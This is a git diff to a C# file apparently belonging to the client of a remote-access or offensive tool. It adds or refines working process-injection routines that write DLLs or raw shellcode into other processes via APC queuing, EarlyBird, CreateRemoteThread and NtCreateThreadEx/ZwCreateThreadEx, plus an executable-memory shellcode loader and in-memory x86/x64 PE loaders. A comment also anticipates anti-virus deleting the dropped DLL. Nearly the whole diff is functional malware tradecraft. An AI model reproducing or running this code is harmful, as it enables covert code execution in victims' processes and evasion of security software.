@@ -25,6 +25,12 @@ namespace winClient48
 
         #region DLL Injection
 
+        /// <summary>
+        /// Save file bytes into a temp file and return the file path.
+        /// </summary>
+        /// <param name="abDllBytes">DLL file bytes.</param>
+        /// <returns>Full path of DLL file.</returns>
+        /// <exception cref="Exception">File does not exist.</exception>
         private string fnSaveDll(byte[] abDllBytes)
         {
             string szTempDllPath = clsEZData.fnGetNewTempFilePath("dll");
@@ -35,6 +41,12 @@ namespace winClient48
             return szTempDllPath;
         }
 
+        /// <summary>
+        /// APC DLL injection.
+        /// </summary>
+        /// <param name="nProcID">Process ID.</param>
+        /// <param name="abDllBytes">DLL file bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnApcDLL(int nProcID, byte[] abDllBytes)
         {
             int nCode = 0;
@@ -42,10 +54,52 @@ namespace winClient48
 
             try
             {
-                
+                //Throw an exception if not found.
+                Process proc = Process.GetProcessById(nProcID);
+
+                string szDllPath = fnSaveDll(abDllBytes);
+
+                //Your DLL file might be deleted by an anti-virus.
+                if (!File.Exists(szDllPath))
+                    throw new Exception("File not found: " + szDllPath);
+
+                IntPtr hProc = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProcID);
+                if (IntPtr.Zero == hProc)
+                    throw new Exception($"OpenPrcess() failed. Error code: {WinAPI.GetLastError()}");
+
+                IntPtr pAddrLoadLibrary = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryW");
+                if (IntPtr.Zero == pAddrLoadLibrary)
+                    throw new Exception($"GetProcessAddress() failed. Error code: {WinAPI.GetLastError()}");
+
+                IntPtr pAllocMemAddr = WinAPI.VirtualAllocEx(
+                    hProc,
+                    IntPtr.Zero,
+                    (uint)((szDllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
+                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE,
+                    WinAPI.PAGE_READWRITE
+                );
+                if (IntPtr.Zero == pAllocMemAddr)
+                    throw new Exception($"Allocating memory space failed. Error code: {WinAPI.GetLastError()}");
+
+                uint nWritten = 0;
+                WinAPI.WriteProcessMemory(
+                    hProc,
+                    pAllocMemAddr,
+                    Encoding.Unicode.GetBytes(szDllPath),
+                    (uint)((szDllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
+                    out nWritten
+                );
+
+                foreach (ProcessThread thd in proc.Threads)
+                {
+                    IntPtr hThread = WinAPI.OpenThread((int)WinAPI.ThreadAccess.QUERY_INFORMATION, false, (uint)thd.Id);
+                    IntPtr ptr = WinAPI.QueueUserAPC(pAddrLoadLibrary, hThread, pAllocMemAddr);
+                    if (IntPtr.Zero == ptr)
+                        throw new Exception($"QueueUserAPC() failed. Error code: {WinAPI.GetLastError()}");
+                }
 
                 nCode = 1;
-                szMsg = "APC injection is successful.";
+                szMsg = "APC injection is finished. Please check!";
             }
             catch (Exception ex)
             {
@@ -55,6 +109,12 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
+        /// <summary>
+        /// EarlyBird DLL injection.
+        /// </summary>
+        /// <param name="nProcID">Process ID.</param>
+        /// <param name="abDllBytes">DLL file bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnEarlyBirdDll(int nProcID, byte[] abDllBytes)
         {
             int nCode = 0;
@@ -62,9 +122,8 @@ namespace winClient48
 
             try
             {
+                //Throw an exception if not found.
                 Process proc = Process.GetProcessById(nProcID);
-                if (proc == null)
-                    throw new Exception($"Cannot find process with ID: {nProcID}");
 
                 string szDllPath = fnSaveDll(abDllBytes);
                 if (!File.Exists(szDllPath))
@@ -130,10 +189,11 @@ namespace winClient48
 
                 uint nRet = WinAPI.ResumeThread(pi.hThread);
                 if (nRet == 0xFFFFFFFF)
-                    throw new Exception($"APC injection failed. Error code: {WinAPI.GetLastError()}");
-
+                    throw new Exception($"EarlyBird injection failed. Error code: {WinAPI.GetLastError()}");
 
                 nCode = 1;
+                szMsg = "EarlyBird injection is finished. Please check!";
+
             }
             catch (Exception ex)
             {
@@ -143,6 +203,12 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
+        /// <summary>
+        /// CreateRemoteThread DLL injection.
+        /// </summary>
+        /// <param name="nProc">Process ID.</param>
+        /// <param name="abDllBytes">DLL file bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnRemoteCreateThreadDLL(int nProc, byte[] abDllBytes)
         {
             int nCode = 0;
@@ -178,8 +244,7 @@ namespace winClient48
                 if (IntPtr.Zero == hThread)
                     throw new Exception($"CreateRemoteThread() failed. Error code: {WinAPI.GetLastError()}");
 
-                szMsg = "CreateRemoteThread() injection is successful.";
-
+                szMsg = "CreateRemoteThread injection is finished. Please check!";
                 nCode = 1;
             }
             catch (Exception ex)
@@ -190,6 +255,12 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
+        /// <summary>
+        /// NtCreateThreadEx DLL injection.
+        /// </summary>
+        /// <param name="nProcId">Process ID.</param>
+        /// <param name="abDllBytes">DLL file bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnNtCreateThreadExDll(int nProcId, byte[] abDllBytes)
         {
             int nCode = 0;
@@ -215,10 +286,11 @@ namespace winClient48
 
                 IntPtr hThread = IntPtr.Zero;
                 uint nResult = WinAPI.NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProc, pAddrLoadLibrary, pAddrRemoteMemory, false, 0, 0, 0, IntPtr.Zero);
-                if ((uint)WinAPI.NTSTATUS.Error == nResult)
+                if (0 != nResult)
                     throw new Exception($"NtCreateThreadEx() failed. Error: {WinAPI.GetLastError()}");
 
                 nCode = 1;
+                szMsg = "NTCreateThreadEx injection is finished. Please checked!";
             }
             catch (Exception ex)
             {
@@ -228,6 +300,12 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
+        /// <summary>
+        /// ZwCreateThreadEx DLL injection.
+        /// </summary>
+        /// <param name="nProcId">Process ID.</param>
+        /// <param name="abDllBytes">DLL file bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnZwCreateThreadExDll(int nProcId, byte[] abDllBytes)
         {
             int nCode = 0;
@@ -235,7 +313,7 @@ namespace winClient48
 
             try
             {
-                //Thrown an exception if the process does not exist.
+                //Throw an exception if the process does not exist.
                 Process.GetProcessById(nProcId);
 
                 IntPtr hProc = WinAPI.OpenProcess(
@@ -267,7 +345,7 @@ namespace winClient48
                     throw new Exception($"GetProcAddress() failed. Error code: {WinAPI.GetLastError()}");
 
                 IntPtr hThread;
-                if ((uint)WinAPI.NTSTATUS.Success != WinAPI.ZwCreateThreadEx(
+                if (0 != WinAPI.ZwCreateThreadEx(
                     out hThread,
                     0x1FFFFF,
                     IntPtr.Zero,
@@ -277,8 +355,7 @@ namespace winClient48
                 )
                     throw new Exception($"ZwCreateThreadEx() failed. Error code: {WinAPI.GetLastError()}");
 
-                szMsg = "ZwCreateThreadEx Injection is successful.";
-
+                szMsg = "ZwCreateThreadEx Injection is finished. Please check!";
                 nCode = 1;
             }
             catch (Exception ex)
@@ -293,6 +370,12 @@ namespace winClient48
 
         #region Shellcode Injection
 
+        /// <summary>
+        /// APC shellcode injection.
+        /// </summary>
+        /// <param name="nProcId">Process ID.</param>
+        /// <param name="abShellCode">Shellcode bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnApcSC(int nProcId, byte[] abShellCode)
         {
             int nCode = 0;
@@ -300,67 +383,46 @@ namespace winClient48
 
             try
             {
+                //Throw an exception if not found.
                 Process proc = Process.GetProcessById(nProcId);
-                if (proc == null)
-                    throw new Exception($"Cannot find process with ID: {nProcId}");
 
-                string szExePath = proc.MainModule.FileName;
-                WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
-                si.cb = Marshal.SizeOf(typeof(WinAPI.STARTUPINFO));
-                WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();
+                IntPtr hProc = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProcId);
+                if (IntPtr.Zero == hProc)
+                    throw new Exception($"OpenPrcess() failed. Error code: {WinAPI.GetLastError()}");
 
-                //Create new process in suspended state to perform APC injection.
-                StringBuilder cmdLine = new StringBuilder($"\"{szExePath}\"");
+                IntPtr pAllocMemAddr = WinAPI.VirtualAllocEx(
+                    hProc,
+                    IntPtr.Zero,
+                    (uint)abShellCode.Length,
+                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE,
+                    WinAPI.PAGE_EXECUTE_READWRITE
+                );
+                if (IntPtr.Zero == pAllocMemAddr)
+                    throw new Exception($"Allocating memory space failed. Error code: {WinAPI.GetLastError()}");
 
-                bool success = WinAPI.CreateProcess(
-                    null,
-                    cmdLine,
-                    IntPtr.Zero, 
-                    IntPtr.Zero, 
-                    false,
-                    WinAPI.CreationFlags.CREATE_SUSPENDED,
-                    IntPtr.Zero, 
-                    null, 
-                    ref si, 
-                    out pi
+                uint nWritten = 0;
+                WinAPI.WriteProcessMemory(
+                    hProc,
+                    pAllocMemAddr,
+                    abShellCode,
+                    (uint)abShellCode.Length,
+                    out nWritten
                 );
 
-                if (!success)
-                    throw new Exception($"Create process failed. Error code: {WinAPI.GetLastError()}");
-
-                //Allocate memory within process and write shellcode
-                IntPtr resultPtr = WinAPI.VirtualAllocEx(
-                    pi.hProcess, 
-                    IntPtr.Zero, 
-                    (uint)abShellCode.Length, 
-                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, 
-                    WinAPI.PAGE_READWRITE
-                );
-                if (IntPtr.Zero == resultPtr)
-                    throw new Exception($"VirtualAllocEx() failed. Error code: {WinAPI.GetLastError()}");
-
-                uint nWritten;
-                bool resultBool = WinAPI.WriteProcessMemory(pi.hProcess, resultPtr, abShellCode, (uint)abShellCode.Length, out nWritten);
-                if (!resultBool)
-                    throw new Exception($"WriteProcessMemory() failed. Error code: {WinAPI.GetLastError()}");
-
-                uint oldProtect = 0;
-                if (IntPtr.Zero == pi.hThread)
-                    throw new Exception($"Invalid valid of pi.hThread. Error code: {WinAPI.GetLastError()}");
-
-                //Modify memory permissions on allocated shellcode
-                resultBool = WinAPI.VirtualProtectEx(pi.hProcess, resultPtr, abShellCode.Length, WinAPI.PAGE_EXECUTE_READ, out oldProtect);
-                if (!resultBool)
+                uint nOldProtect = 0;
+                bool bResult = WinAPI.VirtualProtectEx(hProc, pAllocMemAddr, abShellCode.Length, WinAPI.PAGE_EXECUTE_READWRITE, out nOldProtect);
+                if (!bResult)
                     throw new Exception($"VirtualProtectEx() failed. Error code: {WinAPI.GetLastError()}");
 
-                //Assign address of shellcode to the target thread apc queue
-                IntPtr ptr = WinAPI.QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);
-                if (IntPtr.Zero == ptr)
-                    throw new Exception($"QueueUserAPC() failed. Error code: {WinAPI.GetLastError()}");
+                int nAccess = (int)(WinAPI.ThreadAccess.SET_CONTEXT | WinAPI.ThreadAccess.GET_CONTEXT | WinAPI.ThreadAccess.SUSPEND_RESUME);
 
-                uint nRet = WinAPI.ResumeThread(pi.hThread);
-                if (nRet == 0xFFFFFFFF)
-                    throw new Exception($"APC injection failed. Error code: {WinAPI.GetLastError()}");
+                foreach (ProcessThread thd in proc.Threads)
+                {
+                    IntPtr hThread = WinAPI.OpenThread(nAccess, false, (uint)thd.Id);
+                    IntPtr ptr = WinAPI.QueueUserAPC(pAllocMemAddr, hThread, IntPtr.Zero);
+                    if (IntPtr.Zero == ptr)
+                        throw new Exception($"QueueUserAPC() failed. Error code: {WinAPI.GetLastError()}");
+                }
 
                 nCode = 1;
                 szMsg = "APC injection is finished. Please check.";
@@ -373,6 +435,12 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
+        /// <summary>
+        /// EarlyBird shellcode injection.
+        /// </summary>
+        /// <param name="nProcId">Process ID.</param>
+        /// <param name="abShellCode">Shellcode bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnEarlyBirdSC(int nProcId, byte[] abShellCode)
         {
             int nCode = 0;
@@ -444,6 +512,12 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
+        /// <summary>
+        /// CreateRemoteThread shellcode injection.
+        /// </summary>
+        /// <param name="nProcId">Process ID.</param>
+        /// <param name="abShellCode">Shellcode bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnCreateRemoteThreadSC(int nProcId, byte[] abShellCode)
         {
             int nCode = 0;
@@ -472,8 +546,7 @@ namespace winClient48
                 if (IntPtr.Zero == hThread)
                     throw new Exception($"CreateRemoteThread() failed. Error code: {WinAPI.GetLastError()}");
 
-                szMsg = "CreateRemoteThread injection is successful.";
-
+                szMsg = "CreateRemoteThread injection is finished. Please check!";
                 nCode = 1;
             }
             catch (Exception ex)
@@ -484,6 +557,12 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
+        /// <summary>
+        /// NtCreateThreadEx shellcode injection.
+        /// </summary>
+        /// <param name="nProcId">Process ID.</param>
+        /// <param name="abShellCode">Shellcode bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnNtCreateThreadExSC(int nProcId, byte[] abShellCode)
         {
             int nCode = 0;
@@ -491,7 +570,7 @@ namespace winClient48
 
             try
             {
-                //thrown an exception if the process does not exist.
+                //Throw an exception if not found.
                 Process.GetProcessById(nProcId);
 
                 IntPtr hProc = WinAPI.OpenProcess(WinAPI.PROCESS_ALL_ACCESS, false, nProcId);
@@ -528,6 +607,12 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
+        /// <summary>
+        /// ZwCreateThreadEx shellcode injection.
+        /// </summary>
+        /// <param name="nProcId">Process ID.</param>
+        /// <param name="abShellCode">Shellcode bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnZwCreateThreadExSC(int nProcId, byte[] abShellCode)
         {
             int nCode = 0;
@@ -573,6 +658,11 @@ namespace winClient48
 
         #region Loader
 
+        /// <summary>
+        /// DLL loader.
+        /// </summary>
+        /// <param name="abDllBytes"></param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnLdrLoadDll(byte[] abDllBytes)
         {
             int nCode = 0;
@@ -581,17 +671,19 @@ namespace winClient48
             try
             {
                 string szDllPath = fnSaveDll(abDllBytes);
+                if (!File.Exists(szDllPath))
+                    throw new Exception("DLL file not found: " + szDllPath);
 
                 WinAPI.UnicodeString uModuleName = new WinAPI.UnicodeString();
                 WinAPI.RtlInitUnicodeString(ref uModuleName, szDllPath);
 
                 IntPtr hModule = IntPtr.Zero;
                 WinAPI.LdrLoadDll(null, 0, ref uModuleName, out hModule);
-
                 if (IntPtr.Zero == hModule)
                     throw new Exception($"LdrLoadDll() failed. Error code: {WinAPI.GetLastError()}");
 
                 nCode = 1;
+                szMsg = "Load DLL completed. Please check!";
             }
             catch (Exception ex)
             {
@@ -601,12 +693,11 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
-        ///<summary>
-        ///Perform DLL injection with reflective method.
-        ///</summary>
-        ///<param name="abShellCode"></param>
-        ///<param name="nProcId"></param>
-        ///<returns></returns>
+        /// <summary>
+        /// Shellcode loader.
+        /// </summary>
+        /// <param name="abShellCode"></param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnShellCodeLoader(byte[] abShellCode)
         {
             int nCode = 0;
@@ -615,10 +706,14 @@ namespace winClient48
             try
             {
                 IntPtr funcAddr = WinAPI.VirtualAlloc(
-                             IntPtr.Zero,
-                             (uint)abShellCode.Length,
-                             WinAPI.MEM_COMMIT,
-                             WinAPI.PAGE_EXECUTE_READWRITE);
+                    IntPtr.Zero,
+                    (uint)abShellCode.Length,
+                    WinAPI.MEM_COMMIT,
+                    WinAPI.PAGE_EXECUTE_READWRITE
+                );
+                if (IntPtr.Zero == funcAddr)
+                    throw new Exception($"VirtualAlloc() failed. Error code: {WinAPI.GetLastError()}");
+
                 Marshal.Copy(abShellCode, 0, (IntPtr)(funcAddr), abShellCode.Length);
 
                 IntPtr hThread = IntPtr.Zero;
@@ -626,10 +721,12 @@ namespace winClient48
                 IntPtr pinfo = IntPtr.Zero;
 
                 hThread = WinAPI.CreateThread(IntPtr.Zero, 0, funcAddr, pinfo, 0, out threadId);
+                if (IntPtr.Zero == hThread)
+                    throw new Exception($"CreateThread() failed. Error code: {WinAPI.GetLastError()}");
+
                 WinAPI.WaitForSingleObject(hThread, 0xFFFFFFFF);
 
-                szMsg = "Shellcode injected successfully.";
-
+                szMsg = "Load shellcode completed. Please check!";
                 nCode = 1;
             }
             catch (Exception ex)
@@ -640,6 +737,11 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
+        /// <summary>
+        /// x86 PE loader.
+        /// </summary>
+        /// <param name="abFileBytes">x64 PE file bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnX86PELoader(byte[] abFileBytes)
         {
             int nCode = 0;
@@ -686,18 +788,17 @@ namespace winClient48
 
                     while (true)
                     {
-                        NativeDeclarations.IMAGE_BASE_RELOCATION block =
-                            Marshal.PtrToStructure<NativeDeclarations.IMAGE_BASE_RELOCATION>(IntPtr.Add(relocBase, offset));
+                        NativeDeclarations.IMAGE_BASE_RELOCATION block = Marshal.PtrToStructure<NativeDeclarations.IMAGE_BASE_RELOCATION>(IntPtr.Add(relocBase, offset));
 
-                        if (block.SizeOfBlock == 0) break;
+                        if (block.SizeOfBlock == 0)
+                            break;
 
                         int count = (int)((block.SizeOfBlock - 8) / 2);
                         IntPtr fixupBase = IntPtr.Add(imageBase, (int)block.VirtualAddress);
 
                         for (int i = 0; i < count; i++)
                         {
-                            ushort value = (ushort)Marshal.ReadInt16(
-                                relocBase, offset + 8 + i * 2);
+                            ushort value = (ushort)Marshal.ReadInt16(relocBase, offset + 8 + i * 2);
 
                             ushort type = (ushort)(value >> 12);
                             ushort rva = (ushort)(value & 0xFFF);
@@ -725,20 +826,18 @@ namespace winClient48
 
                 while (true)
                 {
-                    NativeDeclarations.IMAGE_IMPORT_DESCRIPTOR desc =
-                        Marshal.PtrToStructure<NativeDeclarations.IMAGE_IMPORT_DESCRIPTOR>(descPtr);
+                    NativeDeclarations.IMAGE_IMPORT_DESCRIPTOR desc =  Marshal.PtrToStructure<NativeDeclarations.IMAGE_IMPORT_DESCRIPTOR>(descPtr);
 
                     if (desc.Name == 0) break;
 
-                    string dllName = Marshal.PtrToStringAnsi(
-                        IntPtr.Add(imageBase, (int)desc.Name));
+                    string dllName = Marshal.PtrToStringAnsi(IntPtr.Add(imageBase, (int)desc.Name));
 
                     IntPtr hDll = NativeDeclarations.LoadLibrary(dllName);
 
-                    IntPtr thunkRef = IntPtr.Add(imageBase,
-                        (int)(desc.OriginalFirstThunk != 0
-                            ? desc.OriginalFirstThunk
-                            : desc.FirstThunk));
+                    IntPtr thunkRef = IntPtr.Add(
+                        imageBase, 
+                        (int)(desc.OriginalFirstThunk != 0 ? desc.OriginalFirstThunk : desc.FirstThunk)
+                    );
 
                     IntPtr funcRef = IntPtr.Add(imageBase, (int)desc.FirstThunk);
 
@@ -785,6 +884,11 @@ namespace winClient48
             return (nCode, szMsg);
         }
 
+        /// <summary>
+        /// x64 PE loader.
+        /// </summary>
+        /// <param name="abFileBytes">x64 PE file bytes.</param>
+        /// <returns></returns>
         public (int nCode, string szMsg) fnX64PELoader(byte[] abFileBytes)
         {
             int nCode = 0;
@@ -792,6 +896,8 @@ namespace winClient48
 
             try
             {
+                //Acknowledgement: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs
+
                 x64PELoader pe = new x64PELoader(abFileBytes);
 
                 //Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
@@ -993,7 +1099,7 @@ namespace winClient48
 
         #endregion
 
-        class x86PELoader
+        public class x86PELoader
         {
             [StructLayout(LayoutKind.Sequential)]
             struct IMAGE_BASE_RELOCATION
@@ -1157,7 +1263,9 @@ namespace winClient48
 
         public class x64PELoader
         {
-            //Acknowledgement: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs
+            /// <summary>
+            /// Acknowledgement: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs
+            /// </summary>
 
             public struct IMAGE_DOS_HEADER
             {      //DOS .EXE header
@@ -1524,6 +1632,9 @@ namespace winClient48
 
         unsafe class NativeDeclarations
         {
+            /// <summary>
+            /// Acknowledgement: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs
+            /// </summary>
 
             public static uint MEM_COMMIT = 0x1000;
             public static uint MEM_RESERVE = 0x2000;
